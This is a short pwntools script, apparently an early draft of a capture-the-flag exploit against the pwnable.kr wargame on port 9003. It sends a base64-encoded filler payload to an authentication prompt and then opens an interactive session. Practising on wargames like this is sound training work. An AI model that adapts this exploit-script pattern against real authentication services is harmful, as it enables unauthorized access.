from pwn import *
import base64

# Connection details
host = 'pwnable.kr'
# # host = 'localhost'
port = 9003

# context.log_level = 'debug'

# # Establish a remote connection
p = remote(host, port)
# p = process('./hash')

p.recvuntil(b'Authenticate : ') # get all begin data

payload = b'a' * 10
encoded_payload = base64.b64encode(payload)
log.info(b'payload is ' + encoded_payload)
p.sendline(encoded_payload)

p.interactive()

p.close()
